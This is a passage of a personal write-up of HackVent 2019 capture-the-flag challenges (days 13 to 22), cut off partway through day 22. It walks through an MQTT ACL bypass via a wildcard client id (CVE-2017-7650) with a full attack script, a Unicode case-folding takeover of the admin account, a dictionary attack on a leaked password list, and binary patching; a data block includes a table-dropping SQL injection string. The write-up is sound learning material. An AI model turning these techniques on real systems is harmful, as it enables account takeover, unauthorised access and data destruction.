		String note = "auth_token_4835989\0";
		trie.put(unescapeJava(note),0);
		System.out.println("Added to Trie: " + escapeJava(note));

		// Display the trie
		System.out.println(trie);
		System.out.println("Security token exists: " + trie.containsKey(securitytoken));
	}
}
```

Running this output:

```
Created trie.
Added to Trie: auth_token_4835989
Trie[1]={
  Entry(key=auth_token_4835989 [9], value=0, parent=ROOT, left=ROOT, right=auth_token_4835989 [9], predecessor=auth_token_4835989 [9])
}

Security token exists: true

Added to Trie: auth_token_4835989\\u0000
Trie[1]={
  Entry(key=auth_token_4835989
}

Security token exists: false
```

The null character corrupted the tree, and made the "containsKey()" method think the securitytoken did not exist!

So, I entered the securitytoken followed by an escaped null string, "auth_token_4835989\\0", into the web page and received the message:

![Secret Spy Portal STATUS: We will steal all the national chocolate supplies at christmas, 3pm: Here's the building codes: HV19{get_th3_chocolateZ}](images/day13_portal3.png)

The flag is: HV19{get_th3_chocolateZ}

# Day 14 - Achtung das Flag

- Level: Medium
- Author: M. (who else)
- Categories: Fun, Programming

## Challenge Description

Let's play another little game this year. Once again, I promise it is hardly obfuscated.

```
use Tk;use MIME::Base64;chomp(($a,$a,$b,$c,$f,$u,$z,$y,$r,$r,$u)=<DATA>);sub M{$M=shift;##
@m=keys %::;(grep{(unpack("%32W*",$_).length($_))eq$M}@m)[0]};$zvYPxUpXMSsw=0x1337C0DE;###
/_help_me_/;$PMMtQJOcHm8eFQfdsdNAS20=sub{$zvYPxUpXMSsw=($zvYPxUpXMSsw*16807)&0xFFFFFFFF;};
($a1Ivn0ECw49I5I0oE0='07&3-"11*/(')=~y$!-=$`-~$;($Sk61A7pO='K&:P3&44')=~y$!-=$`-~$;m/Mm/g;
($sk6i47pO='K&:R&-&"4&')=~y$!-=$`-~$;;;;$d28Vt03MEbdY0=sub{pack('n',$fff[$S9cXJIGB0BWce++]
^($PMMtQJOcHm8eFQfdsdNAS20->()&0xDEAD));};'42';($vgOjwRk4wIo7_=MainWindow->new)->title($r)
;($vMnyQdAkfgIIik=$vgOjwRk4wIo7_->Canvas("-$a"=>640,"-$b"=>480,"-$u"=>$f))->pack;@p=(42,42
);$cqI=$vMnyQdAkfgIIik->createLine(@p,@p,"-$y"=>$c,"-$a"=>3);;;$S9cXJIGB0BWce=0;$_2kY10=0;
$_8NZQooI5K4b=0;$Sk6lA7p0=0;$MMM__;$_=M(120812).'/'.M(191323).M(133418).M(98813).M(121913)
.M(134214).M(101213).'/'.M(97312).M(6328).M(2853).'+'.M(4386);s|_||gi;@fff=map{unpack('n',
$::{M(122413)}->($_))}m:...:g;($T=sub{$vMnyQdAkfgIIik->delete($t);$t=$vMnyQdAkfgIIik->#FOO
createText($PMMtQJOcHm8eFQfdsdNAS20->()%600+20,$PMMtQJOcHm8eFQfdsdNAS20->()%440+20,#Perl!!
"-text"=>$d28Vt03MEbdY0->(),"-$y"=>$z);})->();$HACK;$i=$vMnyQdAkfgIIik->repeat(25,sub{$_=(
$_8NZQooI5K4b+=0.1*$Sk6lA7p0);;$p[0]+=3.0*cos;$p[1]-=3*sin;;($p[0]>1&&$p[1]>1&&$p[0]<639&&
$p[1]<479)||$i->cancel();00;$q=($vMnyQdAkfgIIik->find($a1Ivn0ECw49I5I0oE0,$p[0]-1,$p[1]-1,
$p[0]+1,$p[1]+1)||[])->[0];$q==$t&&$T->();$vMnyQdAkfgIIik->insert($cqI,'end',\@p);($q==###
$cqI||$S9cXJIGB0BWce>44)&&$i->cancel();});$KE=5;$vgOjwRk4wIo7_->bind("<$Sk61A7pO-n>"=>sub{
$Sk6lA7p0=1;});$vgOjwRk4wIo7_->bind("<$Sk61A7pO-m>"=>sub{$Sk6lA7p0=-1;});$vgOjwRk4wIo7_#%"
->bind("<$sk6i47pO-n>"=>sub{$Sk6lA7p0=0 if$Sk6lA7p0>0;});$vgOjwRk4wIo7_->bind("<$sk6i47pO"
."-m>"=>sub{$Sk6lA7p0=0 if $Sk6lA7p0<0;});$::{M(7998)}->();$M_decrypt=sub{'HACKVENT2019'};
__DATA__
The cake is a lie!
width
height
orange
black
green
cyan
fill
Only perl can parse Perl!
Achtung das Flag! --> Use N and M
background
M'); DROP TABLE flags; --
Run me in Perl!
__DATA__
```

## Solution

First I installed the TK perl module:

```
$ sudo apt install perl-tk
```

Then I fired up the program - it's a nice game that is similar to snake.

![day14_game](images/day14_game.png)

The goal is to move the snake and eat the letters of the flag to advance to the next set of letters.

I ran a de-obfuscator:

```
$ perl -MO=Deobfuscate,-y day14.pl > deob.pl
```


Then with some trial and error, I disabled collision detection of the walls by commenting out the line:

```
    #$JohnDayValleyDesertParsley->cancel unless $p[0] > 1 and $p[1] > 1 and $p[0] < 639 and $p[1] < 479;
```

Similarly, I disabled collision detection for when the snake hit itself:

```
    #$JohnDayValleyDesertParsley->cancel if $q == $cqI or $S9cXJIGB0BWce > 44;
```


This made the game much easier to play.  I experimented with slowing down the speed and other similar items, then decided to just print out the flag.

The following line checked to see if the snake hit the letters:

```
&$T() if $q == $t;
```

So, I changed it to simply always advance to the next two characters:

```
&$T();
```

That function called another function to obtain the next two characters:

```
$d28Vt03MEbdY0 = sub {
    pack 'n', $SacramentoMountainsPricklyPoppy[$S9cXJIGB0BWce++] ^ &$PMMtQJOcHm8eFQfdsdNAS20() & 57005;
}
```

I modified this to print a debug statement:

```
$d28Vt03MEbdY0 = sub {
    $x = pack 'n', $SacramentoMountainsPricklyPoppy[$S9cXJIGB0BWce++] ^ &$PMMtQJOcHm8eFQfdsdNAS20() & 57005;
    $temp += 1;
    print($x) if $temp < 46;
    return $x;
}
```

I ran the modified program and it output the flag:

```
HV19{s@@jSfx4gPcvtiwxPCagrtQ@,y^p-za-oPQ^a-z\x20\n^&&s[(.)(..)][\2\1]g;s%4(...)%"p$1t"%ee}
```

Even though the flag looked strange, it was accepted.  (Although there is a bonus part - see Hidden 04).

# Day 15 - Santa's Workshop

- Level: Hard
- Author: inik & avarx
- Categories: Fun

## Challenge Description

The Elves are working very hard.
Look at [http://whale.hacking-lab.com:2080/])http://whale.hacking-lab.com:2080/) to see how busy they are.

## Solution

I went to the web page and observed the following:

![day15_webpage](images/day15_webpage.png)

I downloaded the web page source by running wget:

```
$ wget -r http://whale.hacking-lab.com:2080/
```

In the file "config.js" there were some interesting variables, such as "username", "password" and "clientId" as well as this interesting line:

```
// var topic = 'HV19/gifts/'+clientid+'/flag-tbd';
```

In addition there was a file called "mqtt.js" that indicated that [MQTT](https://github.com/mqtt/mqtt.github.io/wiki) was being used.

So, I did a web search on "mqtt ctf" and found this [writeup from a similar challenge](https://github.com/flawwan/CTF-Writeups/blob/master/hxp/time_for_h4x0rpsch0rr.md)

I installed [python paho mqtt](https://pypi.org/project/paho-mqtt/#usage-and-api) libraries:

```
# sudo python3 -m pip install paho-mqtt
```

Then I wrote a simple program to connect using a random client id and subscribe to the topic using the call:

```
client.subscribe('HV19/gifts/{}'.format(client_id))
```

Running the program output the "number of gifts" as expected:

```
Using client_id: 0512250622870850
HV19/gifts/0512250622870850 b'7414631'
HV19/gifts/0512250622870850 b'7414641'
```

With a basic client working, I tried to subscribe to [SYS topics](https://github.com/mqtt/mqtt.github.io/wiki/SYS-Topics) and also those mentioned in the other ctf writeup:

```
client.subscribe('$SYS/#', qos = 0)
```

And I got the message:

```
$SYS/broker/version b'mosquitto version 1.4.11
(We elves are super-smart and know about CVE-2017-7650 and the POC.  
So we made a genious fix you never will be able to pass. Hohoho)'
```

According to [the mosquitto 1.4.11 blog post](https://mosquitto.org/blog/2017/05/security-advisory-cve-2017-7650/):

*Pattern based ACLs can be bypassed by clients that set their username/client id to '#' or '+'*

I'm not familiar with those operators, so I read a bit about [mqtt wildcards](https://www.hivemq.com/blog/mqtt-essentials-part-5-mqtt-topics-best-practices/).  In short:

- Single level wildcard: +
- Multi level wildcard: #

Putting this all together, I figured that given that:

1. I subscribed to *'HV19/gifts/' + client_id*
2. Comments in the code referred to *'HV19/gifts/' + client_id + '/flag-tbd'*

Then I needed to have a wildcard after the client_id.  For example, if my client_id is "12345", I want to subscribe to topic "HV19/gifts/12345/+".

So I tried registering with client_id "12345/+" and obtained the flag.

The full solution in python:

```
#!/usr/bin/env python3

import random
import time

import paho.mqtt.client as mqtt

# The URL and port number
HOST = 'whale.hacking-lab.com'
PORT = 9001

def get_random_client_id():
    return '{:016d}'.format(round(random.random() * 1000000000000000))

def on_connect(client, userdata, flags, rc):
    client.subscribe('HV19/gifts/{}'.format(client_id), qos = 0)

def on_message(client, userdata, msg):
    print(msg.topic, msg.payload)

# First establish a connection so the remote broker allows the client_id
client_id = get_random_client_id()
print('Using client_id: {}'.format(client_id))
client = mqtt.Client(client_id=client_id, transport="websockets", clean_session=True)
client.connect(HOST, PORT, 60)

time.sleep(1)
client.disconnect()

# Then make a connection with the same client_id with "/+" appended
client_id = client_id + "/+"
print('Using client_id: {}'.format(client_id))
client = mqtt.Client(client_id=client_id, transport="websockets", clean_session=True)
client.on_connect = on_connect
client.on_message = on_message
client.connect(HOST, PORT, 60)
client.loop_forever()
```

I ran the code and obtained:

```
$ ./day15.py
Using client_id: 0472889324655063
Using client_id: 0472889324655063/+
HV19/gifts/0472889324655063/HV19{N0_1nput_v4l1d4t10n_3qu4ls_d1s4st3r} b'Congrats, you got it. The elves should not overrate their smartness!!!
```

The flag is: HV19{N0_1nput_v4l1d4t10n_3qu4ls_d1s4st3r}

# Day 16 - B0rked Calculator

- Level: Hard
- Author: hardlock
- Categories: Fun, Reverse Engineering

## Challenge Description

Santa has coded a simple project for you, but sadly he removed all the operations.
But when you restore them it will print the flag!

[HV16-b0rked.zip](provided/day16.zip)

## Solution

This was possibly my favorite challenge from HackVent!  So cool.  A non-working calculator is provided and the goal is to fix it.

The key phrase from the description is "he removed all the operations".
This means that all the assembly routines are NOP'ed out.

First I stepped through the code with Immunity Debugger to get a sense of what functions do what.
By changing the operator on the b0rked.exe GUI, and stepping through the assembly, I determined:

- 4015b6: add
- 4015c4: subtract
- 4015d4: multiply
- 4015e4: divide

I ran a disassembly of the code:

```
$ objdump -Mintel -D b0rked.exe
```

And observed that the add function was empty:

```
  4015b6:   c8 00 00 00             enter  0x0,0x0
  4015ba:   8b 45 08                mov    eax,DWORD PTR [ebp+0x8]
  4015bd:   90                      nop
  4015be:   90                      nop
  4015bf:   90                      nop
  4015c0:   c9                      leave  
  4015c1:   c2 08 00                ret    0x8
```

Using binary ninja, I patched the function to actually perform an add:

```
  4015b6:   c8 00 00 00             enter  0x0,0x0
  4015ba:   8b 45 08                mov    eax,DWORD PTR [ebp+0x8]
  4015bd:   03 45 0c                add    eax,DWORD PTR [ebp+0xc]
  4015c0:   c9                      leave  
  4015c1:   c2 08 00                ret    0x8
```

I did similarly with subtract:

```
  4015c4:   c8 00 00 00             enter  0x0,0x0
  4015c8:   8b 45 08                mov    eax,DWORD PTR [ebp+0x8]
  4015cb:   8b 4d 0c                mov    ecx,DWORD PTR [ebp+0xc]
  4015ce:   29 c8                   sub    eax,ecx
  4015d0:   c9                      leave  
  4015d1:   c2 08 00                ret    0x8
```

Multiply:

```
  4015d4:   c8 00 00 00             enter  0x0,0x0
  4015d8:   8b 45 08                mov    eax,DWORD PTR [ebp+0x8]
  4015db:   8b 4d 0c                mov    ecx,DWORD PTR [ebp+0xc]
  4015de:   f7 e1                   mul    ecx
  4015e0:   c9                      leave  
  4015e1:   c2 08 00                ret    0x8
```

And divide:

```
  4015e4:   c8 00 00 00             enter  0x0,0x0
  4015e8:   8b 45 08                mov    eax,DWORD PTR [ebp+0x8]
  4015eb:   8b 4d 0c                mov    ecx,DWORD PTR [ebp+0xc]
  4015ee:   31 d2                   xor    edx,edx
  4015f0:   f7 f1                   div    ecx
  4015f2:   c9                      leave  
```

I ran the patched program, performed an addition operation and got the flag:

![day16_patched](images/day16_patched.png)

**BONUS**:

Actually, initially I wrote a python program to perform the operations.
But patching the assembly is more 31337 :)

```
#!/usr/bin/env python3.7

import struct

result = [0] * 7

result[0] = 0x1762a070 + 0x21ceb5d8
result[1] = 0xaae5b913 - 0x38b57698
result[2] = int(0xbec8cad6 / 2)
result[3] = 0x33b0b623 * 2
result[4] = 0x53bd761a + 0x18a3cd45
result[5] = 0xa8359657 - 0x46c920f4
result[6] = 0x1f5c8c1d * 4

flag = ''.join([struct.pack('<I', item).decode('utf-8') for item in result])

print(flag)
```

The flag is: HV19{B0rked_Flag_Calculat0r}

# Day 17

- Level: Hard
- Author: scryh
- Categories: Fun

## Challenge Description

Buy your special gifts online, but for the ultimative gift you have to become admin.

[http://whale.hacking-lab.com:8881/](http://whale.hacking-lab.com:8881/)

## Solution

On the web page, there was a form to register and a form to login.  I registered and logged in and saw some menu options.

![day 17 menu](images/day17_menu.png)

I clicked on admin and was told I was not on admin.  Then I clicked on source and observed some interesting code.

The user "santa" is an admin:

```
/**
 * Determines if the given user is admin.
 */
function isAdmin($username) {
  return ($username === 'santa');
}
```

The following code checks to see if a user name is already taken:

```
/**
 * Determines if the given username is already taken.
 */
function isUsernameAvailable($conn, $username) {
  $usr = $conn->real_escape_string($username);
  $res = $conn->query("SELECT COUNT(*) AS cnt FROM users WHERE LOWER(username) = BINARY LOWER('".$usr."')");
  $row = $res->fetch_assoc();
  return (int)$row['cnt'] === 0;
}
```

And the following code checks registers a new user:

```
/**
 * Registers a new user.
 */
function registerUser($conn, $username, $password) {
  $usr = $conn->real_escape_string($username);
  $pwd = password_hash($password, PASSWORD_DEFAULT);
  $conn->query("INSERT INTO users (username, password) VALUES (UPPER('".$usr."'),'".$pwd."') ON DUPLICATE KEY UPDATE password='".$pwd."'");
}
```

In other words, when a user registers:

1. Check to see if the username is available (isUsernameAvailable)
2. Register the user by inserting into a table, on duplicate updates the password (registerUser)

It is very strange that UPPER and LOWER are used.  I figured I needed to find something where the UPPER case value and the LOWER case value were different and that:

1. LOWER(username in table) is NOT equal to BINARY LOWER(username provided)
2. UPPER(username) is equal to "SANTA"

- isUserNameAvailable to return true (no rows found)
- registerUser to update the "santa" username

Interestingly, on the same day of challenge, a [related article was posted on hackernews](https://eng.getwisdom.io/hacking-github-with-unicode-dotless-i/), which contained a section

![day 17 github](images/day17_github_article.png)

I explored a bit in python and found such a character:

```
In [1]: mystery_char = chr(0x17f)

In [2]: print(mystery_char)
ſ

In [3]: print(mystery_char.upper())
S

In [4]: print(mystery_char.lower())
ſ

In [5]: print(mystery_char.encode('utf-8'))                                                                      
b'\xc5\xbf'
```

So in short, I registered as: "ſanta":

![day 17 register](images/day17_register.png)

(The post parameter is: username=%C5%BFanta)

Then I logged in as "santa" (using the password I just used to register)

![day 17 login](images/day17_login.png)

Then I accessed the admin page:

![day 17 flag](images/day17_flag.png)

The flag is: HV19{h4v1ng_fun_w1th_un1c0d3}


https://eng.getwisdom.io/hacking-github-with-unicode-dotless-i/

# Day 18

- Level: Hard
- Author: hardlock
- Categories: Fun, ReverseEngineering, Crypto

## Challenge Description

Santa had some fun and created todays present with a special dance. this is what he made up for you:

096CD446EBC8E04D2FDE299BE44F322863F7A37C18763554EEE4C99C3FAD15

Dance with him to recover the flag.

[day18.zip](provided/day18.zip)

## Solution

Overall, this challenge took some googling, guessing and general knowledge of cryptography.

First things first, what type of file is it?

```
$ file dance
dance: Debian binary package (format 2.0)
```

After a check of "deb-pkg --help", I extracted the contents with:

```
$ dpkg-deb --vextract dance extracted
.
./usr
usr/bin
usr/bin/dance
```


I fired up Ghidra, and disassembled the archive - which actually contained 3 executables.

In the decompiled output of dance_block(), I observed some magic constants:

```
  local_68 = 0x61707865;
  // ...
  local_54 = 0x3320646e;
  uStack64 = 0x79622d32;
  /// ...
  uStack44 = 0x6b206574;
```

I did a google search of the number 0x61707865 and found a [stack exchange discussion on Salsa20](https://crypto.stackexchange.com/questions/42354/can-you-help-me-understand-bernstein-s-notes-on-diagonal-constant-of-salsa20).

I did some reading on [Salsa20](https://en.wikipedia.org/wiki/Salsa20), and learned that it is a block cipher that has a:

- 256-bit key
- 64-bit none

Looking at the decompilation of dance(), I found something that looked like a nonce:

```
_dance(&var_B0, r19, &var_70, 0xb132d0a8e78f4511
```

To find the key, I took another guess - I looked deeper in the code for a continuous section of constants.  Using Hopper, this section stood out:

![day18_const](images/day18_const.png)

The only thing is it is 64 bytes, and I only was looking for a 32 byte (256-bit)  key.  So, I just took the first 32 bytes of that stream.

I found a writeup of [how to use the salsa20 cipher with python](https://pycryptodome.readthedocs.io/en/latest/src/cipher/salsa20.html).

I installed the python module:

```
$ sudo python3.7 -m pip install pycryptodome
```

And put together a program:

```
#!/usr/bin/env python3.7

# coding: utf-8

import binascii
import struct

from Crypto.Cipher import Salsa20

def main():

    # Ciphertext obtained from the
    ciphertext = binascii.unhexlify('096CD446EBC8E04D2FDE299BE44F322863F7A37C18763554EEE4C99C3FAD15')

    # 256 bit (32 byte) key)
    key = binascii.unhexlify('0320634661b63cafaa76c27eea00b59bfb2f7097214fd04cb257ac2904efee46')

    assert(len(key) == 32)

    # 64 bit (8 byte) nonce
    nonce = struct.pack('<Q', 0xb132d0a8e78f4511)

    assert(len(nonce) == 8)

    # Create the cipher
    cipher = Salsa20.new(key=key, nonce=nonce)

    # Decrypt the ciphertext
    decoded = cipher.decrypt(ciphertext)

    # Display the result
    print(decoded.decode('utf-8'))

if __name__ == '__main__':
    main()
```

Running the program output the flag:

HV19{Danc1ng_Salsa_in_ass3mbly}

# Day 19 - 🎅

- Level: Hard
- Author: M.
- Categories: Fun


## Challenge Description

🏁🍇🎶🔤🐇🦁🍟🗞🍰📘🥖🖼🚩🥩😵⛺❗️🥐😀🍉🥞🏁👉️🧀🍎🍪🚀🙋🏔🍊😛🐔🚇🔷🎶📄🍦📩🍋💩⁉️🍄🥜🦖💣🎄🥨📺🥯📽🍖🐠📘👄🍔🍕🐖🌭🍷🦑🍴⛪🤧🌟🔓🔥🎁🧦🤬🚲🔔🕯🥶❤️💎📯🎙🎚🎛📻📱🔋😈🔌💻🐬🖨🖱🖲💾💿🧮🎥🎞🔎💡🔦🏮📔📖🏙😁💤👻🛴📙📚🥓📓🛩📜📰😂🍇🚕🔖🏷💰⛴💴💸🚁🥶💳😎🖍🚎🥳📝📁🗂🥴📅📇📈📉📊🔒⛄🌰🕷⏳📗🔨🛠🧲🐧🚑🧪🐋🧬🔬🔭📡🤪🚒💉💊🛏🛋🚽🚿🧴🧷🍩🧹🧺😺🧻🚚🧯😇🚬🗜👽🔗🧰🎿🛷🥌🎯🎱🎮🎰🎲🏎🥵🧩🎭🎨🧵🧶🎼🎤🥁🎬🏹🎓🍾💐🍞🔪💥🐉🚛🦕🔐🍗🤠🐳🧫🐟🖥🐡🌼🤢🌷🌍🌈✨🎍🌖🤯🐝🦠🦋🤮🌋🏥🏭🗽⛲💯🌁🌃🚌📕🚜🛁🛵🚦🚧⛵🛳💺🚠🛰🎆🤕💀🤓🤡👺🤖👌👎🧠👀😴🖤🔤 ❗️➡️ ㉓ 🆕🍯🐚🔢🍆🐸❗️➡️ 🖍🆕㊷ 🔂 ⌘ 🆕⏩⏩ 🐔🍨🍆❗️ 🐔㉓❗️❗️ 🍇 ⌘ ➡️🐽 ㊷ 🐽 ㉓ ⌘❗️❗️🍉 🎶🔤🍴🎙🦖📺🍉📘🍖📜🔔🌟🦑❤️💩🔋❤️🔔🍉📩🎞🏮🌟💾⛪📺🥯🥳🔤 ❗️➡️ 🅜 🎶🔤💐🐡🧰🎲🤓🚚🧩🤡🔤 ❗️➡️ 🅼 😀 🔤 🔒 ➡️ 🎅🏻⁉️ ➡️ 🎄🚩 🔤❗️📇🔪 🆕 🔡 👂🏼❗️🐔🍨🍆❗️🐔🍨👎🍆❗️❗️❗️ ➡️ 🄼 ↪️🐔🄼❗️🙌 🐔🍨🍆❗️🍇🤯🐇💻🔤👎🔤❗️🍉 ☣️🍇🆕🧠🆕🐔🅜❗️❗️➡️ ✓🔂 ⌘ 🆕⏩⏩🐔🍨🍆❗️🐔🅜❗️❗️🍇🐽 ㊷ 🐽 🅜 ⌘❗️❗️ ➡️ ⌃🐽 🄼 ⌘ 🚮🐔🄼❗️❗️➡️ ^💧🍺⌃➖🐔㉓❗️➗🐔🍨👎👍🍆❗️❗️❌^❌💧⌘❗️➡️ ⎈ ↪️ ⌘ ◀ 🐔🅼❗️🤝❎🍺🐽 ㊷ 🐽 🅼 ⌘❗️❗️➖ 🤜🤜 🐔🅜❗️➕🐔🅜❗️➖🐔🄼❗️➖🐔🅼❗️➕🐔🍨👍🍆❗️🤛✖🐔🍨👎👎👎🍆❗️🤛 🙌 🔢⎈❗️❗️🍇 🤯🐇💻🔤👎🔤❗️🍉✍✓ ⎈ ⌘ 🐔🍨👎🍆❗️❗️🍉🔡🆕📇🧠✓ 🐔🅜❗️❗️❗️➡️ ⌘↪️⌘ 🙌 🤷‍♀️🍇🤯🐇💻🔤👎🔤❗️🍉😀🍺⌘❗️🍉 🍉

[d19.utf8.txt](provided/d19.utf8.txt)

## Solution

I first saw this and thought, what the heck?  I tried XOR'ing and all other types of things.  Then I had a thought that this might be an esoteric language.  I searched and found [Emoji](https://esolangs.org/wiki/Emoji), but apparently that was not it, but then I found one more.  Yes, there are (at least) two emoji-based languages!  Another language is [Emojicode](https://www.emojicode.org/).

I downloaded [Emojicode 1.0 beta 1](https://www.emojicode.org/docs/guides/install.html).  The file need to be renamed to have the proper extension and then I "compiled" it:

```
$ cp d19.utf8.txt d19.emojic
$ ./emojicodec d19.emojic
$ ./d19
```

When I ran it, it gave this message:

```
 🔒 ➡️ 🎅🏻⁉️ ➡️ 🎄🚩
```

I have to admit, at this point I was stumped.  I tried to understand the emoji language, which appeared to be a big undertaking.  Luckily, I got a hint to look closer at the message, and that the input is only one character.

Looking at the prompt, it reads: "Lock goes to Santa with '**something**' goes to a Christmas tree and a flag."

Well, it's a matter of guessing what that '**something**' is.  First I thought: presents!  But not it did not work.  Then I thought well, to open the lock you need a key, so I copied the [key emoji](https://emojipedia.org/key/) and pasted it as a response and got the flag.


```
 🔒 ➡️ 🎅🏻⁉️ ➡️ 🎄🚩
🔑
HV19{*<|:-)____\o/____;-D}
```

The flag is: HV19{*<|:-)____\o/____;-D}


# Day 20 - i want to play a game

- Level: Hard
- Author: hardlock
- Categories: ReverseEngineering, Fun

## Challenge Description

Santa was spying you on Discord and saw that you want something weird and obscure to reverse?

your wish is my command.

[HV19-game.zip](provided/day20.zip)

## Solution

I unzipped the archive which contained a single file called "game".  I ran the "strings" command on the file and observed a couple of interesting lines:

```
/mnt/usb0/PS4UPDATE.PUP
f86d4f9d2c049547bd61f942151ffb55
```

The first line suggests the "Playstation 4" and the second line looks like an md5 hash.  I ran a google search on the md5 hash and found [a page that referenced a file with that checksum](https://lania.co/ps4_505.html).

I then opened up the "game" file using ghidra and reviewed the decompiled code.  The first section of the code opens a file, runs an md5 checksum, and exits if it does not match.

The next section of the code gets interesting - it opens up the file, seeks to various offsets, and performs and XOR of the file contents with a section of memory.  The file is the file I downloaded, and I took a guess was the bytes at the beginning of the file at 0x2000.

I rewrote the routine in a standalone module, renamed the variables and created a variable called "flag" that contained the byte string starting at 0x2000.

```
#include <stdio.h>
#include <stdint.h>

int main() {
    uint32_t leet_counter = 0x1337;
    uint32_t xor_counter = 0;

    FILE *fp = fopen("505Retail.PUP", "rb");
    char read_buffer[50];

    char flag [] = "\xce\x55\x95\x4e\x38\xc5\x89\xa5\x1b\x6f\x5e\x25\xd2\x1d\x2a\x2b\x5e\x7b\x39\x14\x8e\xd0\xf0\xf8\xf8\xa5\x00";

    do {
        fseek(fp, leet_counter, 0);
        fread(read_buffer, 0x1a, 1, fp);

        xor_counter = 0;

        do {
            flag[xor_counter] = flag[xor_counter] ^ read_buffer[xor_counter];
            xor_counter += 1;
        } while (xor_counter != 0x1a);

      leet_counter += 0x1337;
    } while (leet_counter != 0x1714908);

    printf("%s\n", flag);

    fclose(fp);

    return 0;
}
```

I compiled and ran the program and got the flag:

```
$ gcc -o day20 day20.c
$ ./day20
HV19{C0nsole_H0mebr3w_FTW}
```

The flag is: HV19{C0nsole_H0mebr3w_FTW}


# Day 21

- Level: Hard
- Author: hardlock
- Categories: Fun, ReverseEngineering, Crypto

## Challenge Description

Santa has improved since the last Cryptmas and now he uses harder algorithms to secure the flag.

This is his public key:

```
X: 0xc58966d17da18c7f019c881e187c608fcb5010ef36fba4a199e7b382a088072f
Y: 0xd91b949eaf992c464d3e0d09c45b173b121d53097a9d47c25220c0b4beb943c
```

To make sure this is safe, he used the NIST P-256 standard.

But we are lucky and an Elve is our friend. We were able to gather some details from our whistleblower:

- Santa used a password and SHA256 for the private key (d)
- His password was leaked 10 years ago
- The password is length is the square root of 256
- The flag is encrypted with AES256
- The key for AES is derived with pbkdf2_hmac, salt: "TwoHundredFiftySix", iterations: 256 * 256 *256

Phew - Santa seems to know his business - or can you still recover this flag?

```
Hy97Xwv97vpwGn21finVvZj5pK/BvBjscf6vffm1po0=
```

## Solution

Wow a lot is going on here.  I initially did some background reading:

- Googled for "NIST P-256" and found some [useful Python libraries](https://pycryptodome.readthedocs.io/en/latest/src/public_key/ecc.html)
- Googled for "password leak 2009" and found the [rock you password leak](https://en.wikipedia.org/wiki/RockYou)
- Used elite math skills to get the square root of 256 = 16
- Googled for "pbkdf2_hmac" and found that the [python hashlib library support pbkdf2_hmac](https://docs.python.org/3/library/hashlib.html#key-derivation)
- Consulted the discord feed - and found out that the number of iterations is not "256*256*256" but "256 * 256 * 256"
- Reviewed the [pycryptodome AES implementation details](https://www.novixys.com/blog/using-aes-encryption-decryption-python-pycrypto/)

Then solving it took some trial and error.

The first part involves constructing an ECC key given a public key (x, y), and guessing a private key.  But not completely guessing out of the blue, this is limited to 16-character passwords from the rockyou leak.

So I created a smaller version of the rockyou file:

```
$ grep "^................$" rockyou.txt > rockyou_16chars.txt
$ wc -l rockyou_16chars.txt
118091 rockyou_16chars.txt
```

Then I learned about the [Crypto.PublicKey.ECC.construct](https://pycryptodome.readthedocs.io/en/latest/src/public_key/ecc.html#Crypto.PublicKey.ECC.construct) function and discovered that it throws an exception when an invalid private key is entered:

```
In [1]: from Crypto.PublicKey import ECC                                                                                                                                     

In [2]: X = 0xc58966d17da18c7f019c881e187c608fcb5010ef36fba4a199e7b382a088072f
   ...: Y = 0xd91b949eaf992c464d3e0d09c45b173b121d53097a9d47c25220c0b4beb943c
   ...:                                                                                                                                                                      

In [3]: ecc = ECC.construct(curve='P-256', d=12345, point_x = X, point_y = Y)                                                                                                
...
ValueError: Private and public ECC keys do not match
```

Thus, there is a way to tell if a private key is valid - it will not throw an exception!  So, in other words iterate through all the passwords, take the SHA256 hash of each one, and see if it is a valid value for the private key in the elliptic curve.

Once done with that, use the password as a parameter to pbkdf2_hmac along with the provided SALT and number of iterations to derive an AES key.  Then use the AES key to decrypt the ciphertext.

Putting it altogether:

```
#!/usr/bin/env python3.7

import base64
import hashlib

from Crypto.Cipher import AES
from Crypto.PublicKey import ECC

# This is his public key
X = 0xc58966d17da18c7f019c881e187c608fcb5010ef36fba4a199e7b382a088072f
Y = 0xd91b949eaf992c464d3e0d09c45b173b121d53097a9d47c25220c0b4beb943c

# Run a dictionary attack on the rock you passwords of length 16
found = False
with open('rockyou_16.txt', 'rb') as rockyou:
    for password in rockyou:
        password = password.strip()

        # Create the hash of the password
        x = hashlib.sha256(password)

        # Convert the hash to an integer
        private_key = int(x.hexdigest(), 16)

        try:
            # Attempt to create an ECC using the hashed password as the private key
            ecc = ECC.construct(curve='P-256', d=private_key, point_x = X, point_y = Y)

            # If the program reached here, the password is valid
            print('The password is {}'.format(password))
            found = True
            winner = password
            break
        except Exception as e:
            pass

# Base64 decode the ciphertext
ciphertext = base64.b64decode('Hy97Xwv97vpwGn21finVvZj5pK/BvBjscf6vffm1po0=')

# Use the winning password
if found == True:
    password = winner
    print('Using the password = {}'.format(password))

    # Derive the AES key based on the parameters that were mentioned
    salt = b'TwoHundredFiftySix'
    iterations = 256 * 256 * 256
    aes_key = hashlib.pbkdf2_hmac('sha256', password, salt, iterations)

    # Use AES to decrypt the ciphertext
    aes = AES.new(aes_key, AES.MODE_ECB)
    print(aes.decrypt(ciphertext))
```

Running it outputs the flag:

```
$ ./day21.py
The password is b'santacomesatxmas'
Using the password = b'santacomesatxmas'
b'HV19{sry_n0_crypt0mat_th1s_year}
```

The flag is: HV19{sry_n0_crypt0mat_th1s_year}

# Day 22 - The command ... is lost

- Level: leet
- Author: inik
- Categories: ReverseEngineering, Fun

## Challenge Description

Santa bought this gadget when it was released in 2010. He did his own DYI project to control his sledge by serial communication over IR. Unfortunately Santa lost the source code for it and doesn't remember the command needed to send to the sledge. The only thing left is this file: thecommand7.data

Santa likes to start a new DYI project with more commands in January, but first he needs to know the old command. So, now it's on you to help out Santa.

[day22](provided/day22.txt)

## Solution

I did a web search of the first line and found something that referenced Arduino.  The challenge description mentioned the year 2010.  Looking at [Wikpedia](https://en.wikipedia.org/wiki/List_of_Arduino_boards_and_compatible_systems), that is when the Arduino Uno came out, which has the ATmega328p processor.

I downloaded a trial version of [AVR Simulator IDE](https://www.oshonsoft.com/avr.html), changed the microprocessor to ATmega328p, ran the program and watched the memory.

In order to run the program I also needed to run:

```
winetricks vb6run
```

I found the shortcuts to be very helpful:

- (F2) Step
- (Ctrl+F1) Switch to Step by Step
- (Ctrl+F2) Switch to Slow Speed
- (Ctrl+F3) Switch to Normal Speed
- (Ctrl+F4) Switch to Fast Speed
- (Ctrl+F5) Switch to Extremely Fast Speed

I switched between the various modes until a saw a memory pattern that looked like:

![memory_dump1](images/day22_avr1.png)
![memory_dump2](images/day22_avr2.png)

I converted the hexbytes to ascii and got the flag:

```
$ cat day22.py
#!/usr/bin/env python3.7

